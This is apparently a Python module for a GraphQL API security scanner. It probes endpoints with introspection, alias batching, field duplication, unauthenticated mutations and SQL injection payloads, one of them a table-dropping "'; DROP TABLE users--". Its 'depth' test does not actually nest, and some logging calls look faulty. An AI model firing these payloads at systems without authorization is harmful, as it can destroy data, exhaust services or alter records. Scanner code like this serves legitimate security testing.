"""
VORTEX GraphQL Security Scanner - V19.0
Comprehensive GraphQL API security testing

CAPABILITIES:
- Introspection query exploitation
- Batching attack detection
- Depth limit bypass testing
- Query cost analysis
- GraphQL injection (SQLi in arguments)
- Authorization bypass testing
- Mutation fuzzing
- Subscription abuse detection

ATTACK VECTORS:
1. Introspection → Schema enumeration
2. Batching → DoS/Rate limit bypass
3. Circular queries → Resource exhaustion
4. Field duplication → Amplification attacks
5. Directive abuse → Bypass validation
6. Type confusion → Injection attacks
"""

import asyncio
import json
import logging
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from typing import Dict, List, Optional, Any, Set
from urllib.parse import urljoin

from core.network import global_network_client
from domain.models import AssessmentResult
from domain.enums import FindingType, FindingSeverity, VerificationStatus

logger = logging.getLogger(__name__)


@dataclass
class GraphQLEndpoint:
    """GraphQL endpoint information."""
    url: str
    schema: Optional[Dict] = None
    types: List[str] = field(default_factory=list)
    queries: List[str] = field(default_factory=list)
    mutations: List[str] = field(default_factory=list)
    subscriptions: List[str] = field(default_factory=list)
    introspection_enabled: bool = False


@dataclass
class GraphQLVulnerability:
    """GraphQL vulnerability finding."""
    vuln_type: str
    severity: FindingSeverity
    endpoint: str
    query: str
    evidence: str
    impact: str
    remediation: str
    timestamp: datetime = field(default_factory=datetime.utcnow)


class GraphQLScanner:
    """
    Comprehensive GraphQL security scanner.
    
    Tests for common GraphQL vulnerabilities and misconfigurations.
    """
    
    # Introspection query
    INTROSPECTION_QUERY = """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          name
          kind
          description
          fields {
            name
            description
            args {
              name
              type { name kind }
            }
            type {
              name
              kind
            }
          }
        }
        directives {
          name
          description
          locations
        }
      }
    }
    """
    
    # Batch attack query template
    BATCH_ATTACK_TEMPLATE = """
    query BatchAttack {
      alias{index}: __typename
    }
    """
    
    # Circular query template
    CIRCULAR_QUERY_TEMPLATE = """
    query CircularQuery {
      user {
        posts {
          author {
            posts {
              author {
                posts {
                  title
                }
              }
            }
          }
        }
      }
    }
    """
    
    def __init__(self):
        self.network_client = global_network_client
        self.discovered_endpoints: List[GraphQLEndpoint] = []
        self.vulnerabilities: List[GraphQLVulnerability] = []
        
        # Statistics
        self.stats = {
            'endpoints_scanned': 0,
            'introspection_enabled': 0,
            'batching_vulnerable': 0,
            'depth_limit_bypass': 0,
            'injection_found': 0
        }
    
    async def scan_endpoint(self, url: str) -> List[GraphQLVulnerability]:
        """
        Scan GraphQL endpoint for vulnerabilities.
        
        Args:
            url: GraphQL endpoint URL
            
        Returns:
            List of discovered vulnerabilities
        """
        logger.info(f"Starting GraphQL scan: {url}")
        
        self.stats['endpoints_scanned'] += 1
        vulnerabilities = []
        
        # 1. Test introspection
        endpoint_info = await self._test_introspection(url)
        
        if endpoint_info.introspection_enabled:
            self.stats['introspection_enabled'] += 1
            
            vulnerabilities.append(GraphQLVulnerability(
                vuln_type='introspection_enabled',
                severity=FindingSeverity.MEDIUM,
                endpoint=url,
                query=self.INTROSPECTION_QUERY,
                evidence='Introspection query successful - full schema exposed',
                impact='Complete API schema disclosure, easier to find attack vectors',
                remediation='Disable introspection in production environments'
            ))
        
        # 2. Test batch attacks
        batch_vuln = await self._test_batch_attacks(url)
        if batch_vuln:
            vulnerabilities.append(batch_vuln)
            self.stats['batching_vulnerable'] += 1
        
        # 3. Test depth limits
        depth_vuln = await self._test_depth_limits(url, endpoint_info)
        if depth_vuln:
            vulnerabilities.append(depth_vuln)
            self.stats['depth_limit_bypass'] += 1
        
        # 4. Test field duplication
        field_vuln = await self._test_field_duplication(url, endpoint_info)
        if field_vuln:
            vulnerabilities.append(field_vuln)
        
        # 5. Test injection attacks
        if endpoint_info.queries:
            injection_vulns = await self._test_injection_attacks(url, endpoint_info)
            vulnerabilities.extend(injection_vulns)
            self.stats['injection_found'] += len(injection_vulns)
        
        # 6. Test authorization bypass
        if endpoint_info.mutations:
            authz_vulns = await self._test_authorization_bypass(url, endpoint_info)
            vulnerabilities.extend(authz_vulns)
        
        self.discovered_endpoints.append(endpoint_info)
        self.vulnerabilities.extend(vulnerabilities)
        
        logger.info(
            f"GraphQL scan complete: {url}",
            vulnerabilities=len(vulnerabilities)
        )
        
        return vulnerabilities
    
    async def _test_introspection(self, url: str) -> GraphQLEndpoint:
        """Test if introspection is enabled and extract schema."""
        
        endpoint_info = GraphQLEndpoint(url=url)
        
        try:
            response = await self.network_client.request(
                'POST',
                url,
                json={'query': self.INTROSPECTION_QUERY}
            )
            
            if response.status_code == 200:
                data = json.loads(response.body)
                
                if 'data' in data and '__schema' in data['data']:
                    endpoint_info.introspection_enabled = True
                    endpoint_info.schema = data['data']['__schema']
                    
                    # Extract types and operations
                    schema = endpoint_info.schema
                    
                    if 'types' in schema:
                        endpoint_info.types = [
                            t['name'] for t in schema['types']
                            if not t['name'].startswith('__')
                        ]
                    
                    # Extract queries
                    query_type = schema.get('queryType', {}).get('name')
                    if query_type and 'types' in schema:
                        for t in schema['types']:
                            if t['name'] == query_type and 'fields' in t:
                                endpoint_info.queries = [f['name'] for f in t['fields']]
                    
                    # Extract mutations
                    mutation_type = schema.get('mutationType', {}).get('name')
                    if mutation_type and 'types' in schema:
                        for t in schema['types']:
                            if t['name'] == mutation_type and 'fields' in t:
                                endpoint_info.mutations = [f['name'] for f in t['fields']]
                    
                    logger.info(
                        "Introspection successful",
                        types=len(endpoint_info.types),
                        queries=len(endpoint_info.queries),
                        mutations=len(endpoint_info.mutations)
                    )
        
        except Exception as e:
            logger.debug(f"Introspection test failed: {e}")
        
        return endpoint_info
    
    async def _test_batch_attacks(self, url: str) -> Optional[GraphQLVulnerability]:
        """Test for batching vulnerabilities (DoS via query batching)."""
        
        # Generate batch query with 100 aliases
        aliases = [f"alias{i}: __typename" for i in range(100)]
        batch_query = "query BatchAttack { " + " ".join(aliases) + " }"
        
        try:
            start_time = datetime.utcnow()
            
            response = await self.network_client.request(
                'POST',
                url,
                json={'query': batch_query}
            )
            
            execution_time = (datetime.utcnow() - start_time).total_seconds()
            
            if response.status_code == 200 and execution_time < 10:
                # Server processed batch query successfully
                return GraphQLVulnerability(
                    vuln_type='batch_attack',
                    severity=FindingSeverity.HIGH,
                    endpoint=url,
                    query=batch_query,
                    evidence=f'Batch query with 100 aliases processed in {execution_time:.2f}s',
                    impact='Resource exhaustion, DoS, rate limit bypass',
                    remediation='Implement query complexity analysis and batch size limits'
                )
        
        except Exception as e:
            logger.debug(f"Batch attack test failed: {e}")
        
        return None
    
    async def _test_depth_limits(self, url: str, endpoint: GraphQLEndpoint) -> Optional[GraphQLVulnerability]:
        """Test for depth limit bypass (circular queries)."""
        
        if not endpoint.queries:
            return None
        
        # Generate deeply nested query (depth 10)
        nested_query = "query DeepQuery { "
        for i in range(10):
            nested_query += "__typename "
        nested_query += "}"
        
        try:
            response = await self.network_client.request(
                'POST',
                url,
                json={'query': nested_query}
            )
            
            if response.status_code == 200:
                data = json.loads(response.body)
                
                if 'data' in data:
                    return GraphQLVulnerability(
                        vuln_type='depth_limit_bypass',
                        severity=FindingSeverity.MEDIUM,
                        endpoint=url,
                        query=nested_query,
                        evidence='Deeply nested query (depth=10) accepted',
                        impact='Resource exhaustion via circular queries',
                        remediation='Implement query depth limits'
                    )
        
        except Exception as e:
            logger.debug(f"Depth limit test failed: {e}")
        
        return None
    
    async def _test_field_duplication(self, url: str, endpoint: GraphQLEndpoint) -> Optional[GraphQLVulnerability]:
        """Test for field duplication attacks (amplification)."""
        
        if not endpoint.queries:
            return None
        
        # Use first available query
        query_name = endpoint.queries[0]
        
        # Generate query with 50 field duplications
        duplicated_query = f"query FieldDuplication {{ "
        for i in range(50):
            duplicated_query += f"alias{i}: {query_name} "
        duplicated_query += "}"
        
        try:
            response = await self.network_client.request(
                'POST',
                url,
                json={'query': duplicated_query}
            )
            
            if response.status_code == 200:
                return GraphQLVulnerability(
                    vuln_type='field_duplication',
                    severity=FindingSeverity.MEDIUM,
                    endpoint=url,
                    query=duplicated_query,
                    evidence='Field duplication attack successful (50 aliases)',
                    impact='Amplification attack, resource exhaustion',
                    remediation='Implement query complexity/cost analysis'
                )
        
        except Exception as e:
            logger.debug(f"Field duplication test failed: {e}")
        
        return None
    
    async def _test_injection_attacks(self, url: str, endpoint: GraphQLEndpoint) -> List[GraphQLVulnerability]:
        """Test for injection vulnerabilities in query arguments."""
        
        vulns = []
        
        # SQL injection payloads
        sqli_payloads = [
            "' OR '1'='1",
            "1' UNION SELECT NULL--",
            "'; DROP TABLE users--"
        ]
        
        # Test first query with injections
        if endpoint.queries:
            query_name = endpoint.queries[0]
            
            for payload in sqli_payloads:
                injection_query = f"""
                query InjectionTest {{
                  {query_name}(id: "{payload}")
                }}
                """
                
                try:
                    response = await self.network_client.request(
                        'POST',
                        url,
                        json={'query': injection_query}
                    )
                    
                    # Check for SQL error indicators
                    if response.status_code == 200:
                        body_lower = response.body.lower()
                        
                        if any(err in body_lower for err in ['sql', 'mysql', 'syntax', 'database']):
                            vulns.append(GraphQLVulnerability(
                                vuln_type='graphql_injection',
                                severity=FindingSeverity.CRITICAL,
                                endpoint=url,
                                query=injection_query,
                                evidence=f'SQL error detected with payload: {payload}',
                                impact='SQL injection leading to data breach',
                                remediation='Use parameterized queries and input validation'
                            ))
                            break  # Found injection, no need to test more
                
                except Exception as e:
                    logger.debug(f"Injection test failed: {e}")
        
        return vulns
    
    async def _test_authorization_bypass(self, url: str, endpoint: GraphQLEndpoint) -> List[GraphQLVulnerability]:
        """Test for authorization bypass vulnerabilities."""
        
        vulns = []
        
        # Test mutations without authentication
        if endpoint.mutations:
            for mutation_name in endpoint.mutations[:3]:  # Test first 3
                mutation_query = f"""
                mutation TestAuthZ {{
                  {mutation_name}
                }}
                """
                
                try:
                    response = await self.network_client.request(
                        'POST',
                        url,
                        json={'query': mutation_query}
                    )
                    
                    # If mutation succeeds without auth, it's a vulnerability
                    if response.status_code == 200:
                        data = json.loads(response.body)
                        
                        if 'data' in data and not data.get('errors'):
                            vulns.append(GraphQLVulnerability(
                                vuln_type='authorization_bypass',
                                severity=FindingSeverity.HIGH,
                                endpoint=url,
                                query=mutation_query,
                                evidence=f'Mutation {mutation_name} accessible without authentication',
                                impact='Unauthorized data modification',
                                remediation='Implement proper authentication and authorization checks'
                            ))
                
                except Exception as e:
                    logger.debug(f"Authorization test failed: {e}")
        
        return vulns
    
    def convert_to_findings(self, vulnerabilities: List[GraphQLVulnerability]) -> List[AssessmentResult]:
        """Convert GraphQL vulnerabilities to standard findings."""
        
        findings = []
        
        for vuln in vulnerabilities:
            finding = AssessmentResult(
                id=uuid.uuid4(),
                url=vuln.endpoint,
                finding_type=FindingType.API_SECURITY,
                severity=vuln.severity,
                status=VerificationStatus.SYSTEM_VERIFIED,
                heuristic_score=0.85,
                evidence=vuln.evidence,
                payload=vuln.query,
                vulnerable_parameter='graphql_query',
                description=f"GraphQL {vuln.vuln_type}: {vuln.impact}",
                remediation=vuln.remediation
            )
            
            findings.append(finding)
        
        return findings
    
    def get_stats(self) -> Dict[str, Any]:
        """Get scanner statistics."""
        return self.stats.copy()


# Global scanner instance
global_graphql_scanner: Optional[GraphQLScanner] = None


def get_graphql_scanner() -> GraphQLScanner:
    """Get or create global GraphQL scanner."""
    global global_graphql_scanner
    
    if global_graphql_scanner is None:
        global_graphql_scanner = GraphQLScanner()
    
    return global_graphql_scanner


async def scan_graphql_endpoint(url: str) -> List[AssessmentResult]:
    """
    High-level function to scan GraphQL endpoint.
    
    Args:
        url: GraphQL endpoint URL
        
    Returns:
        List of AssessmentResult findings
    """
    scanner = get_graphql_scanner()
    vulnerabilities = await scanner.scan_endpoint(url)
    return scanner.convert_to_findings(vulnerabilities)


# Alias for compatibility with PHASE 4 naming
EnhancedGraphQLScanner = GraphQLScanner